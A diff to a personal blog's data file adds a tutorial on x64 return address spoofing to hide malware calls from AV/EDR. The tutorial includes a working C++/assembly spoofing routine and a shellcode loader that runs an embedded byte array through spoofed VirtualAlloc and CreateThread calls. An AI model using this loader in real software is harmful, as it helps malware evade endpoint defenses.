@@ -44,7 +44,7 @@ const blogPosts = {
       description: "This guide will explain what a file upload vulnerability is and how one can use this vulnerability to gain access to a webapp using a reverse shell.",
       song: "Pills",
       songAuthor: "Yung Lain",
-      songLink: "https://www.youtube.com/embed/oYaxzvr0Vrs?si=UOaolYTam0FIUJsk",
+      songLink: "https://www.youtube.com/embed/LrwqD3wsxGw?si=9HBuylgF2OZywGSC",
       image: "https://w.wallhaven.cc/full/1j/wallhaven-1jl6gw.png",
       date: "01-08-2025",
       content: `<p>A file upload vulnerability occurs when a server allows the uploading of files to its filesystem and doesn't correctly sanitise the uploaded media. Failing to properly sanitise the uploaded file can lead to the execution
@@ -227,7 +227,286 @@ NTSTATUS create_hook(LPVOID lpToRun, LPVOID lpTarget) {
       their hacks, In the example code I've used it to grab the <code>superSecretPassword</code> I passed into the function at the beginning.</p>
       <h1>Conclusion</h1>
       <p>If you feel some concepts could use better clarification or you need some support in your programming feel free to contact me on any social media listed on the site and I'll try to see if I can help. Thanks for reading.</p>
-      `  
+      `},
+      "return-address-spoofing": {
+      title: "Return_Address_Spoofing.blg",
+      description: "What is return address spoofing, how is it done, why is it done",
+      song: "I Really Like You pt2",
+      songAuthor: "Sewerslvt",
+      songLink: "https://www.youtube.com/embed/NknuSpM0ji0?si=rEGXGOxsW86B8qlu",
+      image: "/blogdata/17-12-25/background.jpg",
+      date: "17-12-2025",
+      content:`<p>Recently, I've been learning about a new technique in malware development to avoid detection called return address spoofing. This article will go over everything I've learned and how to do return address spoofing within x64
+      architecture. All resources I've used to build my knowledge will be referenced in the <a href="#appendicies">Appendicies</a> section. Light understanding of assembly, x64 architecture and the stack is necessary for this post.</p>
+      <h1>AV/EDR Behaviour</h1>
+      <p>When a process such as Kernel32 tries to execute
+      certain commands AV/EDR's will allow that spesific process to make these actions as it is a known process meaning it can't be doing anything malicious. However, when we develop software that
+      does the same thing AV/EDR's aren't likely to allow us to do so because it's coming from an unknown, random process. The goal of Return Address Spoofing is to make AV/EDR's think our unknown software's calls
+      are actually coming from these trusted programs.</p>
+      <br/>
+      <h1>Backed & Unbacked memory</h1>
+      <p>This also links into "backed" and "unbacked" memory. When a process such as Kernel32 makes function calls, this is coming from a backed part of memory as the process has been mapped into the memory by Windows
+      itself. However, if you're familiar with malware development, you'll know we tend to manually map malware into memory without the help of Windows meaning when we make function calls from our manually mapped
+      programs, they are coming from unbacked memory. This is extremely suspicious and will be flagged by any good AV/EDR.</p>
+      <br/>
+      <p>To show how obvious a call from unbacked memory is, I've provided a screenshot of a manually mapped thread that creates a DialogBox being opened in
+      <a href="https://systeminformer.sourceforge.io/">systemInformer</a>. I've left the code I used to create this <a href="/blogdata/17-12-25/unbackedMemoryFunctionCall.cpp">here</a> if you'd like to reproduce it.
+      <br/>
+      <img style="display: block; margin: auto; padding: 10px;" src="/blogdata/17-12-25/systemInformerUnbackedThread.png"></img>
+      <br/>
+      As you can see, the top of the stack holds a memory address of <code>0x28bc13301da</code>. An AV/EDR can easily see this arbitrary memory address making calls and will immediately flag it, Return Address Spoofing
+      attempts to find a way around this.
+      </p>
+      <h1>Why use Return Address Spoofing?</h1>
+      <p>Return address spoofing allows us to spoof the true caller of functions. This means when we call something like <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa">
+      MessageBoxA</a> from unbacked memory (something that would normally be flagged by AV/EDR) we can "spoof" the true caller of our unbacked memory to a trusted, backed memory address. In other words, it's like
+      disguising our unbacked memory as backed, trusted memory. This makes return address spoofing a powerful tool for avoiding detection.</p>
+      <h1>How does Return Address Spoofing work?</h1>
+      <p>Firstly, we need to understand how we make it look like a function is being called from backed memory in the first place. Luckily, this is quite simple. When a CALL instruction is made in x64 architecture the
+      address of the following instruction is pushed to the stack before execution is passed to the called function. This address that is pushed to the stack is known as the <b>return address</b>. So, when the called
+      function reaches a RET instruction it will JMP to the supplied return address which should allow for the continued execution from where the function was called. The graphic below displays this process.
+      </p>
+      <img style="display: block; margin: auto; padding: 10px;" src=/blogdata/17-12-25/FunctionCallsOnTheStack.png/>
+      <p>The return address is the memory address of what called the function in the first place meaning if the return address is of trusted & backed memory an AV/EDR will assume the function call
+      is not malicious. This is the core idea of return address spoofing; taking the return address and making it return to trusted memory even if it wasn't called from trusted memory to trick AV/EDR into thinking
+      the call is legitemate. We can then add an extra
+      technique onto this by modifying a register used in a JMP call to make the trusted memory address JMP back to our malicious program. Here's a visual representation...</p>
+      <img style="display: block; margin: auto; padding: 10px;" src=/blogdata/17-12-25/ReturnAddressSpoofingOnTheStack.png/>
+      <h1>How to do Return Address Spoofing</h1>
+      <p><i>For full transparency, all code here is derived from <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">hulkops.github.io</a> with slight modifications to make it's syntax
+      work in C++. This is referenced in <a href="#appendicies">Appendicies</a> but I think this is important to disclose here also.</i></p>
+      <br/>
+      <p>The first step of return address spoofing is finding a trusted library we're going to spoof to. This library must have <code>jmp [rbx]</code> instructions within it as we are going to overwrite the contents
+      of <code>rbx</code> to make the trusted library return to the memory address we supply. In this example, I'll be using Kernel32 however many other libraries can be implemented as long as it has
+      the specified instructions.
+      <br/><br/>
+      The following code block is a function that will use GetModuleHandleA() to get a handle to the library we want (kernel32) by name. It will then use this handle to explore the NT Header of the library to find
+      the size of it, then iterating throughout all the contents of the library based on the retrieved size for the <code>jmp [rbx]</code> instructions. Once we find the gadget within the library we return the pointer to the gadget.</p>
+      <br/>
+      <codeblock>UINT64 FindGadget() {
+	PBYTE hModule = (PBYTE)GetModuleHandleA("kernel32");
+	DWORD dwSize = ((PIMAGE_NT_HEADERS64)(hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.SizeOfImage;
+	UINT64 pGadget = NULL;
+
+	// Search for the Byte 0xFF 0X23, which correspond to the instruction "jmp [rbx]"
+	for (int i = 0; i < dwSize - 1; i++) {
+		if (hModule[i] == 0xff && hModule[i + 1] == 0x23) {
+			pGadget = (UINT64)hModule + i;
+			break;
+		}
+	}
+
+	return pGadget;
+}</codeblock><br/>
+      <p>When we get to writing in assembly, we're going to need to be able to access our data in a controlled and easy way, so we'll create a structure and write to it with some parameters that will come in handy
+      when we're writing in ASM.</p>
+      <br/>
+      <codeblock>typedef struct _STACK_CONFIG {
+	PVOID pRopGadget;				// Address of target
+	PVOID pTarget;					// The address of the function which needs to be called
+	DWORD dwNumberOfArgs;			// The number of arguments the target function needs
+	PVOID pEbx;						// Address of our liking when gadget is executed
+	PVOID pArgs;					// Pointer to the arguments of target function
+} STACK_CONFIG, * PSTACK_CONFIG;</codeblock><br/>
+      <p>Finally, we'll make a function that populates this structure. Don't worry if you don't get why we're doing certain actions in our allocation (such as ensuring dwNumberOfTargets is even) as it will be explained
+      in the following "Assembly" section.</p><br/>
+      <codeblock>BOOL SetupConfig(PVOID pGadgets, PSTACK_CONFIG pConfig, PVOID pTarget, DWORD dwArgCount, ...) {
+
+	va_list arg_list;
+
+	// Initialising struct values
+
+	pConfig->dwNumberOfArgs = (dwArgCount > 4) ? dwArgCount : 4;
+	pConfig->dwNumberOfArgs += (dwArgCount % 2 != 0) ? 1 : 0;		 // Number of args is kept even to avoid complex steps in assembly to make sure the stack is aligned.
+	pConfig->pTarget = pTarget;
+	pConfig->pRopGadget = pGadgets;
+	pConfig->pArgs = malloc(8 * pConfig->dwNumberOfArgs);
+
+	if (!pConfig->pArgs) {
+		DBG_PRINT("Unable to allocate memory for arguments.");
+		return FALSE;
+	}
+	memset(pConfig->pArgs, 0x00, 8 * pConfig->dwNumberOfArgs);
+	
+	// Store argument values
+	va_start(arg_list, dwArgCount);
+	for (int i = 0; i < dwArgCount; i++) {
+		((PUINT64)(pConfig->pArgs))[i] = va_arg(arg_list, UINT64);
+	}
+
+	DBG_PRINT("Successfully created config.");
+	DBG_INT(pConfig->dwNumberOfArgs);
+	DBG(pConfig->pTarget);
+	DBG(pConfig->pRopGadget);
+	DBG(pConfig->pArgs);
+
+	return TRUE;
+}</codeblock><br/>
+      <h3>Assembly</h3>
+      <p>x64 windows uses something called <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">fastcall</a>. In short, this means the first four <b>integer</b> arguments supplied
+      to a function are stored in these registers in the following order...
+      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>RCX</code>
+      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>RDX</code>
+      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>R8</code>
+      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>R9</code>
+      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- Any other supplied arguments are placed onto the stack
+      <br/>An odd number of arguments means a padding of 8 bytes will be at the bottom of the stack's argument listing to keep the stack aligned. In addition to this, before the function is called, 32 bits need to be
+      allocated onto the stack. This is known as the "shadow space" and exists so the called function can save the contents of the first four volatile integer arguments stored on registers to memory if necessary.<br/>
+      <br/>
+      Now that's cleared up, let's make an external reference to the assembly code in C++ and get to writing our assembly.
+      <br/><br/>
+      <codeblock>extern "C" void* Spoof(STACK_CONFIG* pConfig);</codeblock>
+      <br/>
+      <p>Now we'll define our Spoof function in assembly. Firstly, we'll want to pop the real return address and store it elsewhere for now. Then, we'll populate the structure with necessary data such as the
+      data in the previously mentioned registers where our first 4 arguments are stored.<p/>
+      <br/>
+      <codeblock>BITS 64
+DEFAULT REL
+
+STRUC Config
+.pRopGadget: RESQ 1
+.pTarget:	 RESQ 1
+.dwArgCount: RESQ 1
+.pRbx		 RESQ 1
+.pArgs:		 RESQ 1
+ENDSTRUC
+
+GLOBAL Spoof
+SECTION .text
+
+Spoof:
+	pop rdi									;pop the real return address and store in rdi register
+	mov r10, rcx							;address of Config, which is passed as an argument in rcx
+	mov r12d, [r10 + Config.dwArgCount]		;number of arguments are stored in r12, writing it to the struct + offset to the dwArgCount element.
+	sub r12d, 4								;no. of arguments on stack, as the first 4 are stored in registers
+	mov r13, [r10 + Config.pArgs]			;set r13 to the Config.pArgs offset to be added to right after.
+	mov rcx, [r13]							;first arg
+	mov rdx, [r13 + 8]						;second arg
+	mov r8, [r13 + 16]						;third arg
+	mov r9, [r13 + 24]						;fourth arg</codeblock><br/>
+    <p>Once all arguments within the 4 registers have been applied, we need to loop through the stack for every argument that has been passed through it. We populate r12 with the total size of all stack arguments so
+    we'll check if that register is equal to 0 at the start of our loop. If it isn't then we'll push the data in the following byte to the stack and decrement r12 by 8 before jumping back to the start of the loop once
+    again.</p><br/>
+    <codeblock>    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	; Loop To Move Arguments On The Stack
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+		
+	lea r12, [r12 * 8]						                ;calculating the size of additional arguments
+	sub rsp, r12							                ;making space on the stack
+        
+loop_start:
+	cmp r12, 0												;checking if the counter is zero
+	jle loop_end
+	mov r15, rsp											;copying stack pointer into temp variable
+	add r15, r12											;address where argument needs to be written
+	sub r15, 8	
+	mov rax, [r13 + 24 + r12]								;copying argument into temp variable
+	mov [r15], rax											;writing argument on the stack
+	sub r12, 8												;decrementing the counter
+	jmp loop_start</codeblock><br/>
+    <p>Once the loop is complete, we'll add our shadow space and push the address of our gadget to the stack to make it our brand new return address. We then modify the value of rbx to the address of "cleanup" so
+    when the gadget runs <code>JMP RBX</code> it will JMP to our cleanup code giving us control once again. Once this is complete, we can jump to our target function and let it execute with certainty it will
+    be redirected back to us.</p><br/>
+    <codeblock>loop_end:
+	mov r13d, [r10 + Config.dwArgCount]						;storing the argument count a in non-volatile register	
+	sub rsp, 32												;shadow space
+	mov rax, [r10 + Config.pRopGadget]						;copying return address to temp variable (Gadget's address)
+	push rax												;pushing the return address on the stack
+	lea rbx, [cleanup]										;setting the value of rbx. ROP Gadget will jump to this address
+	mov [r10 + Config.pRbx], rbx
+	lea rbx, [r10 + Config.pRbx]
+	mov r12, [r10 + Config.pTarget]						
+	jmp r12</codeblock><br/>
+    <p>Finally, we need to define cleanup which will simply revert the stack back to its original state and return us back to wherever Spoof was called from.</p><br/>
+    <codeblock>cleanup:
+	
+	lea r13, [r13 * 8]
+	add rsp, r13											;reverting stack to its original state
+	jmp rdi</codeblock><br/>
+  
+    <h3>Bringing it all together</h3>
+    <p>Now that's all done, all we need to do is just bring our code together within main and voilà, we've successfully created return address spoofing.</p><br/>
+    <codeblock>#include "header.hpp"
+
+unsigned char shellcode[] = { 0x57,0x48,0x89,0xe7,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x01,0x00,0x00,0x48,0x89,0xfc,0x5f,0xc3,0x66,0x2e,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x41,0x89,0xca,0x4c,0x8b,0x58,0x20,0x4d,0x89,0xd9,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x49,0x8b,0x41,0x50,0x31,0xc9,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x20,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x41,0x39,0xca,0x74,0x09,0x4d,0x8b,0x09,0x4d,0x39,0xcb,0x75,0xc1,0xc3,0x49,0x8b,0x41,0x20,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x57,0x56,0x53,0x48,0x63,0x41,0x3c,0x8b,0xbc,0x01,0x88,0x00,0x00,0x00,0x48,0x01,0xcf,0x44,0x8b,0x4f,0x20,0x8b,0x5f,0x14,0x49,0x01,0xc9,0x85,0xdb,0x74,0x51,0x49,0x89,0xcb,0x89,0xd6,0x45,0x31,0xd2,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x41,0x8b,0x01,0x31,0xc9,0x4c,0x01,0xd8,0x4c,0x8d,0x40,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x74,0x1c,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x4c,0x89,0xc0,0x49,0x83,0xc0,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x75,0xe9,0x39,0xce,0x74,0x11,0x49,0x83,0xc2,0x01,0x49,0x83,0xc1,0x04,0x4c,0x39,0xd3,0x75,0xc0,0x5b,0x5e,0x5f,0xc3,0x8b,0x57,0x24,0x4b,0x8d,0x0c,0x53,0x8b,0x47,0x1c,0x5b,0x5e,0x0f,0xb7,0x14,0x11,0x5f,0x49,0x8d,0x14,0x93,0x8b,0x04,0x02,0x4c,0x01,0xd8,0xc3,0x48,0xb8,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x48,0x83,0xec,0x38,0x48,0x89,0x44,0x24,0x25,0xb8,0x6c,0x6c,0x00,0x00,0x66,0x89,0x44,0x24,0x2d,0xc6,0x44,0x24,0x2f,0x00,0xc7,0x44,0x24,0x20,0x74,0x65,0x73,0x74,0xc6,0x44,0x24,0x24,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x4c,0x8b,0x50,0x20,0x4d,0x89,0xd1,0x0f,0x1f,0x44,0x00,0x00,0x49,0x8b,0x41,0x50,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x2a,0x31,0xc9,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x81,0xf9,0x00,0x27,0x9b,0x77,0x74,0x3f,0x4d,0x8b,0x09,0x4d,0x39,0xca,0x75,0xbe,0x4c,0x89,0xd9,0xba,0x86,0x45,0x6a,0xef,0xe8,0xd9,0xfe,0xff,0xff,0x48,0x8d,0x4c,0x24,0x25,0xff,0xd0,0xba,0x7f,0x30,0x7b,0xb4,0x48,0x89,0xc1,0xe8,0xc5,0xfe,0xff,0xff,0x48,0x8d,0x54,0x24,0x20,0x45,0x31,0xc9,0x31,0xc9,0x49,0x89,0xd0,0xff,0xd0,0x31,0xc0,0x48,0x83,0xc4,0x38,0xc3,0x4d,0x8b,0x59,0x20,0xeb,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
+
+int main() {
+	STACK_CONFIG Config_1, Config_2, Config_3;
+	HMODULE pKernel32Dll;
+	UINT64 pAddr, pVirtualAlloc, pCreateThread, pWaitForSingleObject, pGadget;
+	HANDLE hThread;
+
+	pGadget = FindGadget();
+
+	if (!pGadget)
+		return -1;
+
+	pKernel32Dll = GetModuleHandleA("kernel32");
+	pCreateThread = (UINT64)GetProcAddress(pKernel32Dll, "CreateThread");
+	pVirtualAlloc = (UINT64)GetProcAddress(pKernel32Dll, "VirtualAlloc");
+	pWaitForSingleObject = (UINT64)GetProcAddress(pKernel32Dll, "WaitForSingleObject");
+
+	DBG_PRINT("VirtualAlloc")
+	// VirtualAlloc
+	if (!SetupConfig((PVOID)pGadget, &Config_1, (PVOID)pVirtualAlloc, 4, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
+		return -1;
+	pAddr = (UINT64)Spoof(&Config_1);
+	if (!pAddr)
+		return -1;
+
+	DBG_PRINT("Copying Shellcode")
+	// Copying Shellcode
+	memcpy((void* )pAddr, shellcode, sizeof(shellcode));
+
+	DBG_PRINT("CreateThread")
+	// CreateThread
+	if (!SetupConfig((PVOID)pGadget, &Config_2, (PVOID)pCreateThread, 6, NULL, 0x00, pAddr, NULL, 0x00, NULL))
+		return -1;
+	hThread = Spoof(&Config_2);
+	if (!hThread)
+		return -1;
+
+	DBG_PRINT("WaitForSingleObject")
+	// WaitForSingleObject
+	if (!SetupConfig((PVOID)pGadget, &Config_3, (PVOID)pWaitForSingleObject, 2, hThread, INFINITE))
+		return -1;
+	Spoof(&Config_3);
+
+
+	DBG_PRINT("Successful exit");
+
+	return 0;
+}</codeblock><br/>
+    <p><i>The final code (written in C by <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">HulkOps</a>) that this tutorial is based on can be found <a href="https://github.com/HulkOperator/Spoof-RetAddr">
+    here</a> on HulkOps Github.</i></p>
+    <h1>Debugging the PoC</h1>
+    <p>Theoretically, we should now have the ability to call any function with return address spoofing. I've debugged return addres spoofing being used with CreateThread() to show how the process handles once the 
+    assembly code jumps to the target function.<br/><br/>
+    So, once we jump to the target function in our assembly with <code>jmp r12</code> our code enters <code>kernel32.dll!CreateThreadStub</code>. This means the code has successfully entered the CreateThread function and
+    windows is doing what it would do if we normally called CreateThread(). Then, this function hits the <code>ret</code> instruction. This can all be seen in the following image<p>
+    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/returnToSpoofedLibrary.png"/>
+    <p>Once the <code>ret</code> instruction executes you will find yourself in a random position within whatever library you chose to spoof to earlier, for me, I find myself in kernel32.dll!wil_details_GetCurrentFeatureEnabledState+0xfa.
+    As you can see below, this exact address is at the instruction <code>jmp qword ptr ds:[rbx]</code> or as we should know it, <code>jmp [rbx]</code> meaning our code to find the gadget worked. This instruction then
+    executes and since we made rbx point to the address of our cleanup, when <code>jmp [rbx]</code> is called, it enters our cleanup code.</p>
+    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/SpoofedLibraryReturnToCleanup.png"/>
+    <p>Once we're in cleanup, the instructions we wrote to restore the stack to its original state execute and we JMP back to main</p>
+    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/CleanupReturnToMain.png"/>
+    <p>As you can see here, we're back in the main thread after <code>jmp [rbx]</code>.</p>
+    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/ReturnedMain.png"/>
+    <h1>Caviats</h1>
+    <p>So, Return address spoofing seems like a great method of avoiding detection. Wouldn't that be nice! (it isn't.) In truth, return address spoofing is outdated. New techniques such as stack unwinding where an AV/EDR
+    walks the stack counter return address spoofing. This method might still work against primitive forms of AV/EDR's but truthfully, it's nowhere near a high quality technique.</p>
+    <h1>Conclusion</h1>
+    If you feel some concepts could use better clarification or you need some support in your programming feel free to contact me on any social media listed on the homepage and I'll try to see if I can help. I've tried my
+    hardest to keep information abstracted as little as possible whilst keeping it somewhat readable, so I apologise if certain areas seem too wordy or convoluted. Thanks for reading.
+    <h1>Appendicies</h1>
+    <p>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">HulkOps return address spoofing article</a>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\_This was such a help to the creation of this article. Thanks a ton to HulkOps.
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <a href="https://chatgpt.com">ChatGPT</a>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\_Used responsibly to help me get a better understanding of some concepts I had trouble getting a grasp of.
+    </p>
+    `
     }
   };
   
